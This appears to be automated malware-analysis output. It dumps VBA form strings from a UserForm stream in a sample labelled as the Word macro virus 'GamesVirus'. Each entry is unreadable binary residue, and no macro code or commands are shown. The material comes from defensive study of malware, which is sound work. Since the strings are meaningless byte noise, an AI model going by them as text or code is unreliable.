VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a%)a$!a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a$!a%)a%)Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)a%)a%)a%)a%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)a%)a%)a%)a%)Y$!a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y$!Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q$!Y$!QSZYSZYKZYJRQ0B8BRI=kqr��Fs�`��Fs�Ek�W{�W{�X��i��Vs� Ba)JaMkqW{�<ciNsy BaVs�Vs�Fs�`��G{�G{�Ns�_{�Ek�W{�2RQMkqg{�q��)JY:RY1JYVsq=ky+Zi<cqEk�Eky<cqVsy3ZiNsy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I79A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-)a%)a$!Y%)a%)a%)a%)a%)a.1a%)a-)a%)a&1a.1a%)a%)a.1a%)a$!Y&1a$!Y%)a%)Y.1aAJq%)a%)a.1a%)a$!a%)a%)a%)a-)a$!a%)a%)a$!Y%)a.1i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a%)Y$!Y&1a%)a%)a%)a$!Y%)a$!Y%)a8BA$! -)(798IJQ@BI790r��Ek�X��<c�W{�X��a��_{�W{�Vs�i��^s�2Ri<cqNsy)JaW{�3ZiO{�=kyG{�Vs�>s�2RiVs�h��h��h��CZaVsy`��p��;Za;Za;Zi<cq;Zi;ZqEk�Ns�Ek�Mky3Zq<ci
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%) %) 	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
610-)0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A)JY79i

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)I.1Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y.1i-)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a.1i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)a-)a%)a.1i%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a$!Y-)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!QJRY?9Y.1a%)a79Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a$!a-)a%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)a%)a%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a%)Y-)a%)a%)Y?9a%)Y8BY61a.1a%)a%)a-) 790%) .1(?98JRQ8B0W{�G{�Fs�Ek�W{�a��a��W{�O{�Ns�a��O{�*RaX��'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9QNs�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9QEk�=k�Fs�_{�_{�Fs�Ns�G{�_{�g{�W{�LciVs�g{�o{�DciDcqW{�Nsq+Zi2Ri3Zy<cy=k�3Zi2Ra
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! 8BA.10
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)A'9Y(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I/9i(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a.1a%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a-)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)a%)a%)a.1i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a.1i$!a.1a?9Y.1a61a79Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a.1a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y$!a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a%)a%)a%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)Y$!a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y-)Q8BQ%)Y79a%)a%)a&1i.1a%)a$!a.1(8B89JAJRA8B8?908BAG{�Fs�W{�W{�X��X��X��O{�Fs�<cqW{�=k�Eky)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I*Rq2Ri+Zi>s�`��=k�Vs�Vs�<cyEk�Ek�_{�Ek�Ns�Fs�DcqVs�p��`��Mkq_{�EkyNsy;Za*Ra)Ji2Ra)JQ<cq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-)($!(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! -)(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-)0&1A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)A.1Q&1i

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
00B�/9iMk�.1A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)a%)a$!Y%)a%)a%)a&1a%)a79q-)a%)a%)a$!a%)a%)a%)a%)a.1i%)a61a.1a&1i79Q$!a&1i.1a%)a79a&1a$!a%)a$!Y%)a%)a%)a.1i.1i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y$!Y8Ba%)a8BY.1a79Y%)a.1a.1Y%)a$!a%)a%)(8B0JRIJRA?90798798a��i��G{�Ek�a��O{�_{�W{�W{�Mky"RiUkyEk�W{�;ZY2Ri2RaEk�Ek�X��<c�Fs�_{�<c�Dc�g{�Vs�_{�Ns�Vs�EkyDcq4cqVs�Vs�g{�UkqDcq^s�2Ra)Ja!Ja)JY3Zi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!A&1a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a.1i%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a%)a%)a-)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a-)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a$!a%)a%)a61a-)a/9Q%)a8Ba$!I%)a-)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)a%)a%)a%)a%)a%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y$!a%)a.1a61Y-)a79Y8Bi79Y$!a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a$!Y.1 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
798%) JRIJRIAJAP��`��i��P��q��Mk�Fs�X��Fs�,cq!Ja*Ri:RQ'9Q;Zi*Ra
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q=kyNs�Vs�W{�=k�_{�Ek�Fs�Ek�Mk�Ek�Vs�Ns�<c�MkyEkyDcqVs�<cy<cy*Ra`��4ci4cq)Ji!JY<cq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! %) 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%) $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)I61A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)ABRi	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&1a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a%)Y$!a%)a$!a%)a%)a%)a%)a%)a%)a%)a$!Y%)a%)a%)a61a%)a9JQ61a.1a-)Y61a$!a%)a61a%)a.1a%)Y$!a%)a%)a&1i%)a$!Y%)a.1i%)a.1a79Y.1a%)a.1a61a%)a61Y%)a%)Y5)0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-)(IJ8JRQ7988B8P��MkyVs�P��X��W{�W{�_{�@��W{�2RY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY2RY BY2Ri;ZYDcqEk�`��Fs�Fs�<cy=k�;Z�Fs�Mk�Vs�Vs�g{�Mk�DcyEk�Mk�;ZqMk�Mky;Zq2Ra*RaLcq2RaDca BQ<cq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q%)�

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)a'9i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)a%)a%)a%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)a%)a-)a.1a%)a79a79Y$!Y$!a%)a%)a.1i%)a%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a$!a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a-)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)Y.1i.1a%)a61a8Ba$!a.1a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a-)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y$! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! -)(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;ZqEkq_{�)JYFs�Vs�W{�O{�X��Ek�Ukq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q4cq2Ri BQNs�Ek�X��O{�Ns�3Zy<c�3ZyO{�_{�W{�Vs�Vs�Mk�^s�;Zy<cqDcyDcyMky2Ra)JY3Zi;Zi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I(BI2Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-) 610
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0(BY

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(&1Y'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$!a%)a%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)a%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)a%)a%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a.1Y8Ba79Y79Y79YJRa
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)a%)a%)a.1i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a.1a&1a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a.1Y79a.1a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 BYY��a��Dca=k�W{�Fs�G{�r��3ZiEk�'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9AEk�:RQ BYEk�W{�W{�z��>s�>s�Fs�Dcy=k�Ns�`��Mk�EkyMk�Mky3Zq3Zi:Ra+Za:RaEkq BQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1A!Ja1JY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
618.18
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!8/9Q.1A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
